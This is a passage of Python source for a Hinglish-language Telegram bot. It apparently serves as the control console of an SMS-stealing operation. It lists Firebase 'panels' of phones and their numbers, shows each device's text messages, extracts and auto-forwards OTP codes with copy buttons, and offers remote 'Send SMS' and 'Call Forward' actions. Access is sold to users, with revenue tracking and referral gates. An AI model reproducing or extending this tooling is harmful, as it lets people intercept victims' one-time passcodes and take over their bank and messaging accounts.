        for fmt in ("%d %b %Y %I:%M %p", "%d/%m/%Y", "%Y-%m-%d", "%d-%m-%Y", "%d %b %Y"):
            try:
                parsed = datetime.strptime(date_str.strip()[:20], fmt).date()
                return parsed in (yesterday, today, tomorrow)
            except Exception:
                continue
    ts_raw = sms.get("timestamp")
    if ts_raw:
        try:
            ts = float(ts_raw)
            if ts > 1e11: ts /= 1000
            parsed = datetime.fromtimestamp(ts).date()
            return parsed in (yesterday, today, tomorrow)
        except Exception:
            pass
    return False

def bulksearch_panels_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        online = sum(1 for d in cached if d.status == "online")
        bar = "🟢" if online > 0 else "🔴"
        safe_tag = safe_tag_for(tag)
        rows.append([premium_button(
            f"{bar} {tag} — {online} online",
            callback_data=f"bulksearch_panel:{safe_tag}"
        )])
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panels_list_keyboard(is_admin: bool = False, page: int = 0) -> InlineKeyboardMarkup:
    """Paginated — Telegram max 100 buttons / 64-byte callback limit.
    144 panels ek saath bhejne par 'Reply markup is too long' aata tha."""
    tags = [t for t in sorted(DATABASES.keys())
            if is_admin or t not in ADMIN_ONLY_TAGS]
    per_page = 18
    total_pages = max(1, (len(tags) + per_page - 1) // per_page)
    page = max(0, min(int(page), total_pages - 1))
    chunk = tags[page * per_page:(page + 1) * per_page]

    rows = []
    for tag in chunk:
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        total = len(cached)
        online = sum(1 for d in cached if d.status == "online")
        num_count = sum(len(d.numbers) for d in cached if d.numbers)
        bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
        safe_tag = safe_tag_for(tag)
        label = f"{bar} {tag} — {num_count} numbers"
        if is_admin and tag in ADMIN_ONLY_TAGS:
            label = "🔒 " + label
        rows.append([premium_button(label[:60], callback_data=f"panel:{safe_tag}")])

    nav = []
    if page > 0:
        nav.append(premium_button("‹ Prev", callback_data=f"panels:{page-1}"))
    nav.append(premium_button(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav.append(premium_button("Next ›", callback_data=f"panels:{page+1}"))
    rows.append(nav)
    rows.append([premium_button("Refresh", callback_data="panels"),
                 premium_button("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panel_numbers_text(tag: str, devices: list[Device]) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_nums = sum(len(d.numbers) for d in devices)
    lines = [
        f"📡 <b>{html_escape(tag)}</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"🟢 Online: <b>{online}</b>  🔴 Offline: <b>{offline}</b>  📲 Numbers: <b>{total_nums}</b>",
        "━━━━━━━━━━━━━━━━━━",
    ]
    if not devices:
        lines.append("📭 Is panel mein koi device nahi mila.")
    else:
        sorted_devs = sorted(devices, key=lambda x: (0 if x.status == "online" else 1))
        for i, d in enumerate(sorted_devs, 1):
            icon = "🟢" if d.status == "online" else "🔴"
            batt = f" 🔋{d.battery}%" if d.battery else ""
            if d.numbers:
                # Dual-SIM: show both numbers clearly
                if len(d.numbers) == 1:
                    nums_str = f"<code>{html_escape(d.numbers[0])}</code>"
                else:
                    nums_str = "  &  ".join(f"<code>{html_escape(n)}</code>" for n in d.numbers)
                lines.append(f"{i}. {icon} {nums_str}{batt}")
            else:
                lines.append(f"{i}. {icon} ⚙️ <i>{html_escape(d.name[:22])}</i>{batt}")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("<i>Device tap karke OTP dekhein 👇</i>")
    return "\n".join(lines)

def panel_numbers_keyboard(tag: str, devices: list[Device]) -> InlineKeyboardMarkup:
    rows = []
    for d in devices[:25]:
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {d.numbers[0]}"
            if len(d.numbers) > 1:
                lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} ⚙️ {d.name[:20]}"
        rows.append([premium_button(lbl, callback_data=f"sel:{d.id}")])
    rows.append([premium_button("Refresh", callback_data=f"panelref:{safe_tag_for(tag)}"),
                 premium_button("Back", callback_data="panels")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    """
    Format a single SMS into a clean Telegram HTML block.

    Features:
    - Clean minimal layout
    - OTP highlighted with monospace/code formatting
    - Clickable URLs
    - Safe HTML escaping
    - Multilingual SMS support
    - Preserves original message line breaks
    - Works well in Telegram dark/light themes
    """

    body = str(
        sms.get("body")
        or sms.get("message")
        or sms.get("text")
        or ""
    ).strip()

    sender = str(sms.get("sender") or "Unknown").strip()
    number = str(num_label or "Unknown").strip()
    date = str(sms_date(sms) or "Unknown").strip()

    otp = extract_otp(body)

    # Escape user/SMS supplied content so Telegram HTML
    # cannot be broken by < > & characters.
    safe_sender = escape(sender)
    safe_number = escape(number)
    safe_date = escape(date)

    # Preserve SMS formatting while safely escaping HTML.
    safe_body = escape(body)

    # Convert plain URLs into clickable Telegram links.
    # Telegram supports https/http links naturally, so we don't
    # need to inject HTML around them.
    message_lines = safe_body.splitlines() or [""]

    lines = []

    # OTP
    if otp:
        safe_otp = escape(str(otp))
        lines.append(f"🔑 <b>OTP</b>  <code>{safe_otp}</code>")
        lines.append("")

    # Metadata
    lines.extend([
        f"👤 <b>From:</b> {safe_sender}",
        f"📅 <b>Date:</b> {safe_date}",
        f"📱 <b>Number:</b> {safe_number}",
        "",
        "💬 <b>Message</b>",
        "",
        "\n".join(message_lines),
        "",
        "━━━━━━━━━━━━━━━━━━",
    ])

    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    try:
        record_sms_volume(1)
        record_sender_stat(str((sms or {}).get("address") or (sms or {}).get("sender") or "unknown"))
    except Exception:
        pass
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body) or "—"
    sender = escape(str(sms.get("sender") or "Unknown"))
    return (
        "╭━━━━━━━━━━━━━━━━━━━━╮\n"
        "   ✨ <b>NEW OTP RECEIVED</b> ✨\n"
        "╰━━━━━━━━━━━━━━━━━━━━╯\n"
        f"🔑 <b>OTP</b>      : <code>{escape(str(otp))}</code>\n"
        f"📱 <b>Number</b>   : <code>{escape(str(num_label))}</code>\n"
        f"👤 <b>From</b>     : {sender}\n"
        f"📅 <b>Time</b>     : {escape(str(sms_date(sms)))}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 {escape(body)[:900]}\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>📋 Neeche button se OTP tap-to-copy karein</i>"
    )

def device_action_keyboard(dev_id: str, back_page: int = 0,
                           latest_otp: Optional[str] = None,
                           number: Optional[str] = None) -> InlineKeyboardMarkup:
    rows = []
    # ⚡ TAP-TO-COPY row (premium): OTP + Number ek tap me clipboard me
    copy_row = []
    if latest_otp:
        copy_row.append(premium_button(f"Copy OTP  {latest_otp}",
                                       copy_text=str(latest_otp), style="success"))
    if number:
        copy_row.append(premium_button("Copy Number", copy_text=str(number), style="primary"))
    if copy_row:
        rows.append(copy_row)
    rows.extend([
        [premium_button("🔄 Refresh OTP", callback_data=f"sel:{dev_id}"),
         premium_button("⚡ Last 5 OTPs", callback_data=f"msgs5:{dev_id}")],
        [premium_button("📋 Recent OTPs", callback_data=f"rec:{dev_id}"),
         premium_button("📨 View Last 10 SMS", callback_data=f"msgs:{dev_id}")],
        [premium_button("📱 Device Info", callback_data=f"info:{dev_id}"),
         premium_button("✉️ Send SMS", callback_data=f"ss:{dev_id}")],
        [premium_button("📞 Call Forward", callback_data=f"cf:{dev_id}")],
        [premium_button("‹ Back", callback_data=f"pg:{back_page}"),
         premium_button("📡 All Panels", callback_data="panels")],
    ])
    return InlineKeyboardMarkup(rows)

def admin_panel_text() -> str:
    fj = "ON" if FORCE_JOIN_ENABLED else "OFF"
    rg = "ON" if REFERRAL_ENABLED else "OFF"
    channel_count = len(FORCE_JOIN_CHANNELS)
    channel_text = f"{channel_count} configured" if channel_count else "Not set"
    return (
        f"{premium_emoji()} <b>ADMIN PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users    : {len(all_users)}\n"
        f"✅ Allowed Users  : {len(allowed_users)}\n"
        f"📡 Active Chats   : {len(chats_registry)}\n"
        f"🗄 Connected DBs  : {len(DATABASES)}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Force Join     : <b>{fj}</b>\n"
        f"📢 Channels       : <b>{channel_text}</b>\n"
        f"🎁 Referral Gate  : <b>{rg}</b>\n"
        f"👥 Required Refs  : <b>{REQUIRED_REFERRALS}</b>\n"
        f"🔑 Access Gate    : <b>{'ON' if GRANT_ACCESS_REQUIRED else 'OFF (open)'}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🗄 Auto DB       : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b>"
        f" ({AUTO_DB_INTERVAL}s)\n"
        f"🎯 DB Group      : <b>{AUTO_DB_GROUP or 'Not set'}</b>\n"
        f"🗄 Backup Ch.    : <b>{AUTO_DB_BACKUP_GROUP or 'Not set'}</b>\n"
        f"🛠 Maintenance   : <b>{'ON' if MAINTENANCE_MODE else 'OFF'}</b>\n"
        "━━━━━━━━━━━━━━━━━━"
    )


def admin_keyboard() -> InlineKeyboardMarkup:
    keys = [
        [premium_button("Add Active Firebase", callback_data="admin_add_active_db", emoji_id="5235588635885054955", style="success"),
         premium_button("Remove Dead Firebase", callback_data="admin_remove_dead_db", emoji_id="5246772116543512028", style="danger")],
        [premium_button("Add Panel URL (Bulk)", callback_data="admin_add_main_db", emoji_id="5235588635885054955", style="primary")],
        [premium_button("Private Log Channel", callback_data="admin_log_channel", emoji_id="5253742260054409879", style="primary"),
         premium_button("Media Manager", callback_data="media_mgr", emoji_id="5372849966689566579", style="primary")],
        [premium_button("Grant Access", callback_data="admin_grant_access", emoji_id="4958689671950369798", style="success"),
         premium_button("Revoke Access", callback_data="admin_revoke_access", emoji_id="4958900559139570572", style="danger")],
        [premium_button("User List", callback_data="admin_users", emoji_id="5372849966689566579", style="primary"),
         premium_button("Access List", callback_data="admin_access_list", emoji_id="6235476345451716705", style="primary")],
        [premium_button("Force Join", callback_data="admin_force_join", emoji_id="4956719506027185156", style="primary"),
         premium_button("Referral Gate", callback_data="admin_referral", emoji_id="5084613633418199991", style="success")],
        [premium_button("Broadcast", callback_data="admin_broadcast", emoji_id="5098265504796115765", style="primary"),
         premium_button("Refresh", callback_data="admin_refresh", emoji_id="5116414868357907335", style="primary")],
        [premium_button("Set Admin Panel", callback_data="admin_setadmin_list", emoji_id="6235476345451716705", style="primary")],
        [premium_button("Close", callback_data="close_msg", emoji_id="4958900559139570572", style="danger")],
    ]
    return InlineKeyboardMarkup(keys)

def admin_setadmin_keyboard(page: int = 0) -> InlineKeyboardMarkup:
    """Paginated — 144 panels ek saath = 'Reply markup is too long'."""
    tags = sorted(DATABASES.keys())
    per_page = 18
    total_pages = max(1, (len(tags) + per_page - 1) // per_page)
    page = max(0, min(int(page), total_pages - 1))
    chunk = tags[page * per_page:(page + 1) * per_page]
    rows = []
    for tag in chunk:
        safe_tag = safe_tag_for(tag)
        if tag in ADMIN_ONLY_TAGS:
            label = f"🔒 {tag}"
        else:
            label = f"🔓 {tag}"
        rows.append([premium_button(label[:60], callback_data=f"toggleadmin:{safe_tag}")])
    nav = []
    if page > 0:
        nav.append(premium_button("‹ Prev", callback_data=f"setadmin:{page-1}"))
    nav.append(premium_button(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav.append(premium_button("Next ›", callback_data=f"setadmin:{page+1}"))
    rows.append(nav)
    rows.append([premium_button("Back to Admin", callback_data="admin_refresh"),
                 premium_button("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def admin_force_join_keyboard() -> InlineKeyboardMarkup:
    state = "Disable" if FORCE_JOIN_ENABLED else "Enable"
    return InlineKeyboardMarkup([
        [premium_button(
            state + " Force Join",
            callback_data="admin_fj_toggle",
            emoji_id="4956719506027185156",
            style=("danger" if FORCE_JOIN_ENABLED else "success")
        )],
        [premium_button(
            "Add Channel",
            callback_data="admin_fj_add",
            emoji_id="5098265504796115765",
            style="primary"
        )],
        [premium_button(
            "List Channels",
            callback_data="admin_fj_list",
            emoji_id="5372849966689566579",
            style="primary"
        ), premium_button(
            "Remove Channel",
            callback_data="admin_fj_remove",
            emoji_id="4956719506027185156",
            style="danger"
        )],
        [premium_button(
            "Back to Admin",
            callback_data="admin_refresh",
            emoji_id="5372849966689566579",
            style="primary"
        )],
    ])


def admin_referral_keyboard() -> InlineKeyboardMarkup:
    state = "Disable" if REFERRAL_ENABLED else "Enable"
    rows = [
        [premium_button(state + " Referral Gate", callback_data="admin_ref_toggle", emoji_id="5084613633418199991", style=("danger" if REFERRAL_ENABLED else "success"))],
        [premium_button("Set Required Referrals", callback_data="admin_ref_required", emoji_id="5372849966689566579", style="primary")],
        [premium_button("Referral Stats", callback_data="admin_ref_stats", emoji_id="5098265504796115765", style="primary")],
        [premium_button("Back to Admin", callback_data="admin_refresh", emoji_id="5372849966689566579", style="primary")],
    ]
    return InlineKeyboardMarkup(rows)


def admin_force_join_text() -> str:
    state = "ON" if FORCE_JOIN_ENABLED else "OFF"
    lines = [
        "🔒 <b>FORCE JOIN SETTINGS</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Status : <b>{state}</b>",
        f"Channels : <b>{len(FORCE_JOIN_CHANNELS)}</b>",
        ""
    ]

    if FORCE_JOIN_CHANNELS:
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
            channel = html_escape(str(channel_data.get("channel", "") or ""))
            url = str(channel_data.get("url", "") or "")
            url_status = "Custom URL" if url else "Auto/Public URL"
            lines.append(f"<b>{index}.</b> <code>{channel}</code> — {url_status}")
    else:
        lines.append("❌ <i>No Force Join channels configured.</i>")

    lines.extend([
        "",
        "━━━━━━━━━━━━━━━━━━",
        "User ko access ke liye configured sabhi channels join karne honge.",
        "Bot ko target channels mein admin/member-check permission ke liye add karna zaroori ho sakta hai."
    ])
    return "\n".join(lines)


def admin_referral_text() -> str:
    state = "ON" if REFERRAL_ENABLED else "OFF"
    total_qualified = sum(referral_count(uid) for uid in all_users)
    return (
        "🎁 <b>REFERRAL GATE SETTINGS</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"Status          : <b>{state}</b>\n"
        f"Required        : <b>{REQUIRED_REFERRALS}</b> referrals\n"
        f"Qualified total : <b>{total_qualified}</b>\n"
        "━━━━━━━━━━━━━━━━━━"
    )


def admin_setadmin_text() -> str:
    locked = len(ADMIN_ONLY_TAGS)
    total  = len(DATABASES)
    return (f"🔒 <b>Admin-Only Panels</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔒 Hidden: {locked}  |  🔓 Visible: {total - locked}  |  📡 Total: {total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Panel pe click karo → Admin-Only ON/OFF toggle ho jayega:")

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML"):
    """Edit message; agar edit fail ho (copy_text/emoji/not-modified) to
    naya message bhej dete hain — user ko hamesha response milega."""
    if parse_mode == "HTML":
        text = ensure_quote(premiumize_text(text), parse_mode)
    else:
        text = ensure_quote(text, parse_mode)
    try:
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        return True
    except Exception as e:
        msg = str(e).lower()
        # Same text dobara — koi problem nahi, bas answer de do.
        if "not modified" in msg:
            return True
        tlog(f"safe_edit ERROR: {type(e).__name__}: {e}")
        # Fallback 1: reply_markup hata ke dobara try (kabhi keyboard hi
        # reject hota hai — copy_text + premium emoji combo).
        if reply_markup is not None:
            try:
                await query.edit_message_text(text=text, parse_mode=parse_mode)
                await query.message.reply_text(
                    "⬇️ Buttons neeche 👇",
                    reply_markup=reply_markup,
                )
                return True
            except Exception as e2:
                tlog(f"safe_edit fallback1 ERROR: {type(e2).__name__}: {e2}")
        # Fallback 2: naya message bhej do.
        try:
            await query.message.reply_text(
                text, reply_markup=reply_markup, parse_mode=parse_mode
            )
            return True
        except Exception as e3:
            tlog(f"safe_edit fallback2 ERROR: {type(e3).__name__}: {e3}")
            return False
    
def safe_tag_for(tag: str) -> str:
    """Collision-proof short tag for callback_data (64-byte limit).
    Purana transform lossy tha — do panels ke pehle 30 chars same hone par
    galat panel khul/delete ho sakta tha. Ab hash suffix har tag ko unique
    banata hai."""
    base = tag.replace(" ", "_").replace(":", "").replace("/", "")
    digest = hashlib.md5(tag.encode("utf-8")).hexdigest()[:6]
    return f"{base[:22]}~{digest}"


def find_tag_by_safe(safe_tag: str) -> Optional[str]:
    # New hash-based format (exact match)
    for tag in DATABASES.keys():
        if safe_tag_for(tag) == safe_tag:
            return tag
    # Backward-compat: legacy lossy format (purane messages ke buttons)
    for tag in DATABASES.keys():
        st = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        if st == safe_tag:
            return tag
    return None

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

NO_ACCESS_TEXT = (
    "🚫 <b>Access Denied</b>\n"
    "━━━━━━━━━━━━━━━━━━\n"
    "Aapko is bot use karne ki ijazat nahi hai.\n"
    "Admin se contact karein: @showxofficial\n"
    "━━━━━━━━━━━━━━━━━━"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    # Auto-grant admin to the configured owner username.
    maybe_promote_admin(user)
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    if all_users.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 Aap banned hain.")
        return

    if not is_admin and MAINTENANCE_MODE:
        await update.message.reply_text(
            "🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Bot abhi maintenance par hai. Thodi der baad try karein.",
            parse_mode="HTML"
        )
        return

    is_new_user = chat_id not in all_users
    if is_new_user:
        all_users[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "banned": False,
            "referrals": [],
            "referral_qualified": False,
        }
    else:
        all_users[chat_id].setdefault("referrals", [])
        all_users[chat_id].setdefault("referral_qualified", False)

    # Save/update profile information.
    if user:
        all_users[chat_id]["name"] = user.full_name
        all_users[chat_id]["username"] = user.username or ""

    referred_now = False
    referrer_id = None
    # /start ref_<user_id> referral deep link.
    if ctx.args:
        payload = str(ctx.args[0]).strip()
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload[4:])
                referred_now = register_referrer(chat_id, referrer_id)
            except ValueError:
                pass

    chats_registry.add(chat_id)
    save_data()

    # Private log channel events (quote format handled inside sender)
    try:
        if is_new_user:
            await send_private_log(
                ctx.bot,
                f"👤 <b>NEW JOIN</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"User: {format_user_log_line(user)}\n"
                f"Date: <code>{all_users[chat_id].get('joined_at', '-')}</code>\n"
                f"Chat ID: <code>{chat_id}</code>",
            )
        if referred_now and referrer_id:
            ref_name = html_escape(all_users.get(referrer_id, {}).get("name", "Unknown"))
            await send_private_log(
                ctx.bot,
                f"🎁 <b>REFERRAL LINKED</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"New user: {format_user_log_line(user)}\n"
                f"Referrer: {ref_name} | <code>{referrer_id}</code>\n"
                f"Refs now: <b>{referral_count(referrer_id)}</b>/{REQUIRED_REFERRALS}\n"
                f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>",
            )
    except Exception as e:
        tlog(f"start log error: {e}")

    if is_admin:
        total_devs  = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        total_nums  = sum(len(d.numbers) for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.numbers)
        online_devs = sum(1 for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.status == "online")
        # Latest OTP across all online devices (most recent timestamp wins)
        latest_otp_global = None
        latest_otp_num    = None
        latest_otp_ts     = 0
        for v in GLOBAL_DEVICE_CACHE.values():
            for d in v:
                if d.status != "online":
                    continue
                # We can't fetch SMS here (expensive) — skip; show placeholder
        otp_line = (
            f"🔑 Last OTP : <b><code>{latest_otp_global}</code></b>  ({html_escape(latest_otp_num)})\n"
            if latest_otp_global else ""
        )
        # Build a quick "numbers bar" — first 5 online numbers for at-a-glance
        online_nums = []
        for v in GLOBAL_DEVICE_CACHE.values():
            for d in v:
                if d.status == "online" and d.numbers:
                    online_nums.extend(d.numbers)
                if len(online_nums) >= 5:
                    break
            if len(online_nums) >= 5:
                break
        nums_bar = ""
        if online_nums:
            nums_bar = "🟢 <i>" + "  |  ".join(html_escape(n) for n in online_nums[:5])
            if total_nums > 5:
                nums_bar += f"  +{total_nums - 5} more"
            nums_bar += "</i>\n"

        welcome_txt = (
            f"{premium_emoji()} <b>{BOT_BRAND_NAME}</b> — ADMIN PANEL\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👋 <b>{html_escape(user.first_name if user else 'Admin')}</b> — system online\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📡 Panels    :  <b>{len(DATABASES)}</b>\n"
            f"📱 Devices   :  <b>{total_devs}</b>  ·  🟢 <b>{online_devs}</b> online\n"
            f"🔢 Numbers   :  <b>{total_nums}</b>\n"
            + (f"{nums_bar}" if nums_bar else "")
            + "━━━━━━━━━━━━━━━━━━\n"
            "<i>Devices List → number select → OTP milega 👇</i>"
        )
        await send_welcome_with_media(
            ctx.bot, chat_id, welcome_txt,
            reply_markup=get_reply_menu(True), user_id=chat_id,
        )
        return

    ready, reason = await gate_state(ctx.bot, chat_id)
    if not ready:
        await send_gate_message(update, ctx, reason)
        return

    # Keep the existing manual access model as a final gate.
    if not has_access(chat_id):
        await update.message.reply_text(
            f"👋 Hello, <b>{user.first_name if user else 'User'}</b>!\n\n"
            "🚫 <b>Access Required</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Aapka account gate complete kar chuka hai.\n"
            "Lekin is bot mein manual access bhi enabled hai.\n"
            f"Your ID: <code>{chat_id}</code>",
            parse_mode="HTML"
        )
        return

    welcome_txt = (
        f"{premium_emoji()} <b>{BOT_BRAND_NAME}</b> {premium_emoji()}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name if user else 'User'}</b>\n"
        "✅ Access verified — system online.\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Neeche menu se kaam shuru karein 👇</i>"
    )
    await send_welcome_with_media(
        ctx.bot, chat_id, welcome_txt,
        reply_markup=get_reply_menu(is_admin), user_id=chat_id,
    )


async def cmd_grant(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /grant <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        days = int(ctx.args[1]) if len(ctx.args) > 1 else 0
        grant_access(target_id, days=days)
        udata = all_users.get(target_id, {})
        name  = udata.get("name", "Unknown")
        # F4: revenue tracking
        try:
            amount = float(ctx.args[2]) if len(ctx.args) > 2 else 0.0
        except (ValueError, IndexError):
            amount = 0.0
        revenue_log_grant(target_id, name, days, amount)
        await update.message.reply_text(f"✅ Access granted to {name} ({target_id})")
        try:
            await ctx.bot.send_message(
                target_id,
                "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start likhein.",
                parse_mode="HTML"
            )
        except: pass
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        revoke_access(target_id)
        await update.message.reply_text(f"❌ Access revoked for user {target_id}")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_setadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        lines = ["🔒 <b>Admin-Only Panel Set karo</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/setadminpanel TAG_NAME</code>", "",
                 "<b>Available Panels:</b>"]
        for tag in sorted(DATABASES.keys()):
            lock = "🔒 " if tag in ADMIN_ONLY_TAGS else "   "
            lines.append(f"{lock}<code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in DATABASES:
        await update.message.reply_text(f"❌ Panel '{tag}' nahi mila. Sahi TAG naam likho.")
        return
    ADMIN_ONLY_TAGS.add(tag)
    save_data()
    await update.message.reply_text(
        f"🔒 Panel <code>{tag}</code> ab <b>Admin-Only</b> ho gaya!\n"
        f"Users ko ab ye panel nahi dikhega.",
        parse_mode="HTML"
    )

async def cmd_unsetadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        if not ADMIN_ONLY_TAGS:
            await update.message.reply_text("ℹ️ Abhi koi admin-only panel set nahi hai.")
            return
        lines = ["🔓 <b>Admin-Only Panels (unlock karo):</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/unsetadminpanel TAG_NAME</code>", ""]
        for tag in sorted(ADMIN_ONLY_TAGS):
            lines.append(f"🔒 <code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in ADMIN_ONLY_TAGS:
        await update.message.reply_text(f"ℹ️ Panel '{tag}' admin-only nahi था।")
        return
    ADMIN_ONLY_TAGS.discard(tag)
    save_data()
    await update.message.reply_text(
        f"🔓 Panel <code>{tag}</code> ab <b>sab ko visible</b> ho gaya!",
        parse_mode="HTML"
    )

async def cmd_adminpanels(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ADMIN_ONLY_TAGS:
        await update.message.reply_text("ℹ️ Koi panel admin-only set nahi hai abhi.")
        return
    lines = [f"🔒 <b>Admin-Only Panels ({len(ADMIN_ONLY_TAGS)} total):</b>", "━━━━━━━━━━━━━━━━━━"]
    for tag in sorted(ADMIN_ONLY_TAGS):
        lines.append(f"🔒 <code>{tag}</code>")
    lines += ["━━━━━━━━━━━━━━━━━━", "Unhide: <code>/unsetadminpanel TAG</code>"]
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

async def _on_callback_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, REFERRAL_ENABLED, REQUIRED_REFERRALS
    query = update.callback_query
    data = query.data or ""
    chat_id = query.message.chat_id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    _log(f"CB {chat_id} admin={is_admin} data={data[:60]!r}")

    # F8: Quick Ban callback
    if data.startswith("qban:"):
        await handle_quickban_callback(query, ctx)
        return

    # F7: Multi-admin approval callbacks
    if data.startswith("approve:") or data.startswith("reject:"):
        await handle_approval_callback(query, ctx)
        return

    # F10: Paginated user list
    if data.startswith("upage:"):
        await handle_upage_callback(query, ctx)
        return

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id):
        await query.answer(); return

    # Gate callbacks are available before full bot access.
    if data == "verify_join":
        await query.answer("Checking membership…")
        ready, reason = await gate_state(ctx.bot, chat_id)
        if reason == "force_join":
            await safe_edit(
                query,
                "🔒 <b>JOIN REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\nSabhi required channels join nahi mile. Pehle sabhi channels join karein, phir Verify dabayein.",
                reply_markup=force_join_keyboard()
            )
            return
        if reason == "referrals":
            await safe_edit(
                query,
                f"🎁 <b>REFERRAL UNLOCK</b>\n━━━━━━━━━━━━━━━━━━\nValid referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>\n━━━━━━━━━━━━━━━━━━",
                reply_markup=referral_gate_keyboard(chat_id)
            )
            return
        if ready and has_access(chat_id):
            await safe_edit(query, "✅ <b>Verified!</b>\n/start karke bot menu open karein.", reply_markup=None)
        elif ready:
            await safe_edit(query, f"✅ Gate complete.\nYour ID: <code>{chat_id}</code>\nAdmin access required.", reply_markup=None)
        return

    if data == "gate_refresh":
        await query.answer("Refreshing…")
        ready, reason = await gate_state(ctx.bot, chat_id)
        if reason == "force_join":
            await safe_edit(query, "🔒 <b>JOIN REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\nSabhi channels join karke Verify dabayein.", reply_markup=force_join_keyboard())
        elif reason == "referrals":
            await safe_edit(query, f"🎁 <b>REFERRAL UNLOCK</b>\n━━━━━━━━━━━━━━━━━━\nProgress: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>", reply_markup=referral_gate_keyboard(chat_id))
        elif ready and has_access(chat_id):
            await safe_edit(query, "✅ <b>Unlocked</b>\n/start karke bot menu open karein.")
        else:
            await safe_edit(query, f"✅ Gate complete.\nYour ID: <code>{chat_id}</code>\nAdmin access required.")
        return

    if data == "my_ref":
        await query.answer()
        link = build_bot_referral_link(chat_id)
